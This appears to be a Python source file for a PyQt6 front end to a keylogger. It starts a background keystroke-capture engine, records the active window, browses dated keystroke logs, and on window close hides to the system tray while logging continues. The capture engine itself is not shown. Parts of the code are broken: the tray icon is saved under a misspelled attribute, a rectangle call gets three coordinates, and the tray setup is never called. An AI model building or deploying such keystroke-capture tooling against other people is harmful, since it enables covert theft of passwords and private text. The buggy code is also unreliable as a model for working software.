import pystray
from PIL import Image, ImageDraw


import datetime
import glob
import os

import threading

from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QHBoxLayout, QVBoxLayout,
    QSplitter, QPushButton, QLabel, QLineEdit,
    QCheckBox, QCalendarWidget,
    QDialog, QDialogButtonBox, QStatusBar, QFrame, QApplication

)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QAction, QColor

from LogFileManager import LogFileManager
from KeyloggerEngine import KeyloggerEngine
from PlatformUtils import PlatformUtils
from UI_Components.FileTreeWidget import FileTreeWidget
from UI_Components.LogViewerWidget import LogViewerWidget
from UI_Components.ThemeManager import ThemeManager


# ===========================================================================
# Worker signal bridge — thread-safe UI updates
# ===========================================================================

class LogSignalBridge(QObject):
    """
    Bridges background thread → main UI thread safely.

    Problem: Qt FORBIDS updating widgets from background threads.
    Your dpg version used queue.Queue + manual polling in _update_loop().

    PyQt6 solution: pyqtSignal
    - Signal emitted from ANY thread
    - Qt automatically delivers it on the MAIN thread
    - No queue polling needed

    Think of it like a thread-safe event dispatcher.
    """
    log_updated = pyqtSignal(str)   # carries the filepath that was updated


# ===========================================================================
# Main Application Window
# ===========================================================================

class KeyloggerViewerApp(QMainWindow):
    """
    PyQt6 equivalent of KeyloggerViewerApp (dpg version).

    DPG: One giant class managing tags, manual render loop, dpg context
    PyQt6: QMainWindow subclass — Qt manages the window lifecycle

    Structure mirrors the dpg version:
        __init__          → same
        build_ui          → same concept, different API
        _build_left_panel → same
        _build_right_panel→ same
        _update_loop      → replaced by QTimer
        _update_status    → same logic
    """

    UPDATE_INTERVAL_MS = 2000       # 2 seconds (was UPDATE_INTERVAL_SECONDS = 2.0)
    KB_TO_MB_THRESHOLD = 1024

    def __init__(self):
        super().__init__()

        # ── Backend (unchanged from dpg version) ────────────────────────
        self.get_active_window = PlatformUtils.setup_platform_libraries()
        self.file_manager = LogFileManager()

        # ── Thread-safe signal bridge (replaces queue.Queue) ─────────────
        # The keylogger runs in a background thread.
        # When it writes a keystroke, it emits this signal.
        # Qt delivers the signal on the main thread → safe to update widgets.
        self.signal_bridge = LogSignalBridge()
        self.signal_bridge.log_updated.connect(self._on_log_updated)

        # ── Keylogger engine ─────────────────────────────────────────────
        # Pass emit method instead of a queue
        # We wrap it in a lambda so KeyloggerEngine doesn't need to know about Qt
        self.keylogger = KeyloggerEngine(
            self.file_manager,
            self.get_active_window,
            log_update_queue=_SignalQueue(self.signal_bridge)
        )

        # ── App state ───────────────────────────────────────────────────
        self.current_viewing_file = None
        self.auto_scroll_enabled = True

        # ── Window setup ────────────────────────────────────────────────
        self.setWindowTitle("Keylogger with Viewer")
        self.resize(1200, 700)

        # ── Build UI ────────────────────────────────────────────────────
        self._build_ui()

        # ── Periodic update timer (replaces manual while loop) ──────────
        # QTimer fires every N milliseconds on the main thread
        # This replaces your: while dpg.is_dearpygui_running(): app._update_loop()
        self.update_timer = QTimer(self)
        self.update_timer.timeout.connect(self._update_status)
        self.update_timer.start(self.UPDATE_INTERVAL_MS)


    def _create_tray_icon(self):
        """Create system tray icon"""
        # Draw a simple icon
        img = Image.new('RGB', (64,64), color=(30, 30, 30))
        draw = ImageDraw.Draw(img)
        draw.rectangle([16, 16, 48 ], fill=(0, 120, 215))

        menu = pystray.Menu(
            pystray.MenuItem("Show", self._show_from_tray),
            pystray.MenuItem("Quit", self._quit_app)
        )

        self.tray_con = pystray.Icon("Keylogger", img, "Keylogger with Viewer", menu)
        threading.Thread(target=self.tray_icon.run, daemon=True). start()

    def _show_from_tray(self):
        self.show()
        self.raise_()

    def _quit_app(self):
        if self.tray_icon:
            self.tray_icon.stop()
        self.keylogger.stop()
        QApplication.quit()

    def closeEvent(self, event):
        """Minimize to tray instead of closing"""
        event.ignore()
        self.hide()





    # ===================================================================
    # UI Construction
    # ===================================================================

    def _build_ui(self):
        """
        Build main window layout.

        DPG used dpg.table(2 columns) for left/right panels.
        PyQt6 uses QSplitter — gives user a draggable divider between panels.
        """
        # Apply theme to the whole app
        ThemeManager.setup_theme(self.parent() or self)

        # Menu bar
        self._build_menu_bar()

        # Central widget — QMainWindow requires one
        central = QWidget()
        self.setCentralWidget(central)

        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(8, 8, 8, 8)
        main_layout.setSpacing(0)

        # QSplitter = dpg.table with 2 columns
        # User can drag the divider to resize panels
        splitter = QSplitter(Qt.Orientation.Horizontal)
        splitter.setHandleWidth(0) # Set to 0 to hide the handle

        # Build panels
        left_panel = self._build_left_panel()
        right_panel = self._build_right_panel()

        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)

        # Set initial sizes: 255px left, rest to right
        # equivalent to dpg: init_width_or_weight=255 on left column
        splitter.setSizes([310, 890])

        main_layout.addWidget(splitter)

        # Status bar at bottom of window
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.lbl_file_count = QLabel("Files: 0")
        self.status_bar.addPermanentWidget(self.lbl_file_count)

    def _build_menu_bar(self):
        """
        Build menu bar.

        DPG: dpg.menu_bar() → dpg.menu() → dpg.menu_item()
        PyQt6: menuBar() → addMenu() → addAction()
        """
        menubar = self.menuBar()
        help_menu = menubar.addMenu("Help")

        # QAction = dpg.add_menu_item
        about_action = QAction("About", self)
        about_action.triggered.connect(self._show_about)
        help_menu.addAction(about_action)

    def _build_left_panel(self) -> QWidget:
        """
        Build left panel: start/stop buttons, search, calendar, file tree.

        Returns a QWidget (the panel) to be added to the splitter.
        """
        panel = QWidget()
        panel.setMinimumWidth(310)
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 8, 0)
        layout.setSpacing(6)

        # ── Start / Stop buttons ─────────────────────────────────────────
        self.btn_start = QPushButton("▶ Start Logging")
        self.btn_start.setToolTip("Begin recording all keystrokes")
        self.btn_start.clicked.connect(self._start_logging)
        self.btn_start.setStyleSheet(ThemeManager.get_button_style("green"))
        layout.addWidget(self.btn_start)

        self.btn_stop = QPushButton("⏸ Stop Logging")
        self.btn_stop.setToolTip("Stop recording keystrokes")
        self.btn_stop.clicked.connect(self._stop_logging)
        self.btn_stop.setEnabled(False)
        self.btn_stop.setStyleSheet(ThemeManager.get_button_style("red"))
        layout.addWidget(self.btn_stop)

        layout.addSpacing(5)

        # ── Section label ────────────────────────────────────────────────
        layout.addWidget(self._section_label("Log Files"))
        # layout.addWidget(self._separator()) # Removed separator

        # ── Search input ─────────────────────────────────────────────────
        # QLineEdit = dpg.add_input_text(label="🔍 Search")
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("🔍 Search")
        # textChanged signal fires on every keystroke — same as dpg callback
        self.search_input.textChanged.connect(self._on_search_changed)
        layout.addWidget(self.search_input)

        layout.addSpacing(8)

        # ── Calendar ─────────────────────────────────────────────────────
        layout.addWidget(self._section_label("Selected Date"))
        # layout.addWidget(self._separator()) # Removed separator

        # QCalendarWidget = dpg.add_date_picker()
        self.calendar = QCalendarWidget()
        self.calendar.setStyleSheet("""
            QToolButton#qt_calendar_monthbutton::menu-indicator { image: none; }""")
        self.calendar.setSelectedDate(
            datetime.date.today()
        )
        self.calendar.setMaximumHeight(220)
        layout.addWidget(self.calendar)

        btn_load_date = QPushButton("Load Selected Date")
        btn_load_date.clicked.connect(self._load_from_calendar)
        layout.addWidget(btn_load_date)

        btn_refresh = QPushButton("🔄 Refresh Current")
        btn_refresh.clicked.connect(self._refresh_viewer)
        layout.addWidget(btn_refresh)

        layout.addSpacing(16)
        # layout.addWidget(self._separator()) # Removed separator

        # ── File tree ─────────────────────────────────────────────────────
        # FileTreeWidget is now a QWidget — just add it to layout
        # No need for a container tag like "file_tree_container" in dpg
        self.file_tree = FileTreeWidget(panel, self.file_manager)

        # Connect signals — replaces:
        #   self.file_tree.on_file_selected = self._on_file_selected
        #   self.file_tree.on_file_deleted  = self._on_file_deleted
        self.file_tree.file_selected.connect(self._on_file_selected)
        self.file_tree.file_deleted.connect(self._on_file_deleted)
        self.file_tree.populate()

        # stretch=1 so the tree fills remaining vertical space
        layout.addWidget(self.file_tree, stretch=1)
        # layout.addWidget(self._separator()) # Removed separator

        return panel

    def _build_right_panel(self) -> QWidget:
        """Build right panel: status header + log viewer + controls."""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(8, 0, 0, 0)
        layout.setSpacing(6)

        # ── Status header ─────────────────────────────────────────────────
        status_row = QHBoxLayout()

        status_row.addWidget(QLabel("Status:"))
        self.lbl_status = QLabel("Ready")
        self.lbl_status.setStyleSheet("color: #ffa500;")  # Orange
        status_row.addWidget(self.lbl_status)

        status_row.addSpacing(16)
        status_row.addWidget(self._pipe_label())
        status_row.addSpacing(16)

        status_row.addWidget(QLabel("Tracking:"))
        self.lbl_executable = QLabel("Not running")
        self.lbl_executable.setStyleSheet("color: #6496ff;")
        status_row.addWidget(self.lbl_executable)
        status_row.addStretch()

        layout.addLayout(status_row)
        layout.addWidget(self._separator())

        # ── Log viewer ────────────────────────────────────────────────────
        # LogViewerWidget is a QWidget — just add it
        self.log_viewer = LogViewerWidget()
        layout.addWidget(self.log_viewer, stretch=1)

        # ── Auto-scroll checkbox ──────────────────────────────────────────
        self.chk_autoscroll = QCheckBox("Auto-scroll")
        self.chk_autoscroll.setChecked(True)
        self.chk_autoscroll.stateChanged.connect(self._on_autoscroll_toggled)
        layout.addWidget(self.chk_autoscroll)

        return panel

    # ===================================================================
    # Helper widget factories
    # These replace repeated dpg.add_text / dpg.add_separator patterns
    # ===================================================================

    def _section_label(self, text: str) -> QLabel:
        """Styled section heading label."""
        lbl = QLabel(text)
        lbl.setStyleSheet("color: #c8c8ff; font-weight: bold;")
        return lbl

    def _separator(self) -> QFrame:
        """Horizontal separator line — dpg.add_separator()"""
        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setFrameShadow(QFrame.Shadow.Sunken)
        return line

    def _pipe_label(self) -> QLabel:
        """Pipe character used as visual divider in status row."""
        lbl = QLabel("|")
        lbl.setStyleSheet("color: #646464;")
        return lbl

    # ===================================================================
    # Button Callbacks (Slots)
    # ===================================================================

    def _start_logging(self):
        """
        Start the keylogger.

        DPG: dpg.configure_item(tag, enabled=False)
        PyQt6: widget.setEnabled(False)
        """
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.lbl_status.setText("Logging")
        self.lbl_status.setStyleSheet("color: #00ff00;")

        threading.Thread(target=self.keylogger.start, daemon=True).start()

        today_log_file = self.file_manager.get_log_filename()
        self.current_viewing_file = today_log_file

        if not os.path.exists(today_log_file):
            with open(today_log_file, 'w', encoding='utf-8') as f:
                f.write("")

        self.log_viewer.load_file(today_log_file, self.file_manager)
        self.log_viewer.set_auto_scroll(True)
        self._update_storage_indicator()

    def _stop_logging(self):
        """Stop the keylogger."""
        self.keylogger.stop()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.lbl_status.setText("Stopped")
        self.lbl_status.setStyleSheet("color: #ff0000;")

    def _load_from_calendar(self):
        """
        Load log file for the calendar's selected date.

        DPG: dpg.get_value(ui_ids['date_picker']) returned a dict
        PyQt6: calendar.selectedDate() returns a QDate object
        """
        qdate = self.calendar.selectedDate()
        # Convert QDate → Python datetime
        selected_date = datetime.datetime(qdate.year(), qdate.month(), qdate.day())
        filepath = self.file_manager.get_log_filename(selected_date)

        if os.path.exists(filepath):
            self.log_viewer.load_file(filepath, self.file_manager)
        else:
            self.log_viewer.update_content(
                f"No logfile found for {selected_date.strftime('%B %d, %Y')}"
            )
        self._update_storage_indicator()

    def _refresh_viewer(self):
        """Refresh the currently viewed log."""
        if self.keylogger.is_running:
            today = datetime.datetime.now()
            filepath = self.file_manager.get_log_filename(today)
            self._refresh_log_viewer(filepath, auto_scroll=True)
        elif self.current_viewing_file:
            self._refresh_log_viewer(self.current_viewing_file)

    def _refresh_log_viewer(self, filepath, auto_scroll=False):
        """Reload content into the log viewer."""
        try:
            content = self.file_manager.read_file(filepath)
            self.log_viewer.update_content(content)
            if auto_scroll and self.auto_scroll_enabled:
                self.log_viewer.set_auto_scroll(True)
        except Exception as e:
            print(f"Error refreshing log viewer: {e}")

    def _on_search_changed(self, text: str):
        """Filter file tree as user types."""
        self.file_tree.populate(text)

    def _on_file_selected(self, filepath: str):
        """Called when user clicks a file in the tree."""
        self.current_viewing_file = filepath
        self.log_viewer.load_file(filepath, self.file_manager)
        self._update_storage_indicator()

    def _on_file_deleted(self, filepath: str):
        """Called when a file is deleted from the tree."""
        if self.log_viewer.current_filepath == filepath:
            self.log_viewer.clear()
            self._update_storage_indicator()

    def _on_autoscroll_toggled(self, state: int):
        """
        QCheckBox state: 0 = unchecked, 2 = checked
        (Qt.CheckState.Checked = 2)
        """
        self.auto_scroll_enabled = (state == Qt.CheckState.Checked.value)
        self.log_viewer.set_auto_scroll(self.auto_scroll_enabled)

    def _on_log_updated(self, log_file: str):
        """
        Called on main thread when keylogger writes a keystroke.

        Replaces the queue.Queue polling in dpg's _update_loop().
        This is called automatically by Qt's signal system — no polling needed.
        """
        if self.current_viewing_file == log_file:
            self._refresh_log_viewer(log_file, auto_scroll=True)

    # ===================================================================
    # Periodic Updates (replaces dpg render loop polling)
    # ===================================================================

    def _update_status(self):
        """
        Called every 2 seconds by QTimer.

        DPG version: called manually inside while dpg.is_dearpygui_running()
        PyQt6 version: QTimer fires this automatically on main thread
        """
        if self.keylogger.is_running:
            try:
                executable = self.get_active_window()
                self.lbl_executable.setText(executable)
            except Exception:
                self.lbl_executable.setText("Unknown")

            self.file_tree.populate(self.search_input.text())
        else:
            self.lbl_executable.setText("Not running")

        file_count = len(glob.glob("keylogs/keylog_*.txt"))
        self.lbl_file_count.setText(f"Files: {file_count}")

        self._update_storage_indicator()

    # ===================================================================
    # Storage Monitoring (same logic as dpg version, unchanged)
    # ===================================================================

    def _get_current_file_size(self) -> int:
        current_file = self.log_viewer.current_filepath
        if not current_file:
            return 0
        try:
            return os.path.getsize(current_file) if os.path.exists(current_file) else 0
        except OSError as e:
            print(f"Error getting file size: {e}")
            return 0

    def _format_file_size(self, size_bytes: int) -> str:
        size_kb = size_bytes / 1024.0
        if size_kb < self.KB_TO_MB_THRESHOLD:
            return f"{size_kb:.1f} KB"
        return f"{size_kb / 1024.0:.2f} MB"

    def _get_storage_color(self, size_bytes: int) -> tuple:
        size_kb = size_bytes / 1024.0
        if size_kb < 100:
            return (150, 200, 255)
        elif size_kb < 512:
            return (255, 200, 100)
        return (255, 100, 100)

    def _update_storage_indicator(self):
        size_bytes = self._get_current_file_size()
        self.log_viewer.update_storage(
            self._format_file_size(size_bytes),
            self._get_storage_color(size_bytes)
        )

    # ===================================================================
    # Dialogs
    # ===================================================================

    def _show_about(self):
        """
        About dialog.

        DPG: dpg.window(modal=True, ...) built manually with dpg widgets
        PyQt6: QDialog — a self-contained modal window class
        """
        dialog = QDialog(self)
        dialog.setWindowTitle("About")
        dialog.setFixedSize(400, 250)

        layout = QVBoxLayout(dialog)

        title = QLabel("Keylogger with Viewer")
        title.setStyleSheet("color: #6496ff; font-size: 16px; font-weight: bold;")
        layout.addWidget(title)

        layout.addWidget(QLabel("Version 2.1 - Storage Monitor Edition"))
        layout.addSpacing(10)
        layout.addWidget(QLabel("A modern keylogging and log viewing application"))
        layout.addSpacing(10)
        layout.addWidget(QLabel("Built with:"))
        layout.addWidget(QLabel("  • PyQt6 - Native Qt6 UI"))
        layout.addWidget(QLabel("  • pynput - Keystroke capture"))
        layout.addWidget(QLabel("  • Python 3.7+"))

        # QDialogButtonBox provides standard OK/Cancel buttons
        buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok)
        buttons.accepted.connect(dialog.accept)
        layout.addWidget(buttons)

        dialog.exec()   # exec() = modal (blocks until closed)


# ===========================================================================
# Signal Queue Adapter
# ===========================================================================

class _SignalQueue:
    """
    Adapter that makes a Qt signal look like a queue.Queue to KeyloggerEngine.

    KeyloggerEngine calls: self.log_update_queue.put_nowait(filepath)
    This adapter forwards that call to: signal_bridge.log_updated.emit(filepath)

    Pattern: Adapter — lets two incompatible interfaces work together
    without modifying either class. KeyloggerEngine stays unchanged.
    """

    def __init__(self, signal_bridge: LogSignalBridge):
        self._bridge = signal_bridge

    def put_nowait(self, value):
        """Called by KeyloggerEngine — emits Qt signal instead of queuing."""
        self._bridge.log_updated.emit(value)

    def empty(self):
        """KeyloggerEngine never calls this, but keeps the interface complete."""
        return True